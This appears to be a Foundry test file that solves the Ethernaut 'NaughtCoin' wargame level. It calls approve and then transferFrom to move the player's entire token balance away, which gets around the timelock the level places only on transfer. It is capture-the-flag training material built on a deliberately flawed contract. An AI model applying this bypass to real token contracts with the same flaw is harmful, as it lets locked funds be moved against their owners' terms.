// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/NaughtCoin/NaughtCoin.sol";
import "levels/NaughtCoin/NaughtCoinFactory.sol";
import "./utils/EthernautTest.sol";

contract NaughtCoinTest is Test {
    function test_naughtcoin() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        address levelAddress = ethernautTest.setup(naughtCoinFactory);

        // Exploit
        vm.startPrank(tx.origin);
        ERC20(levelAddress).approve(tx.origin, NaughtCoin(levelAddress).balanceOf(tx.origin));
        ERC20(levelAddress).transferFrom(tx.origin, address(0x0000dead), NaughtCoin(levelAddress).balanceOf(tx.origin));
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
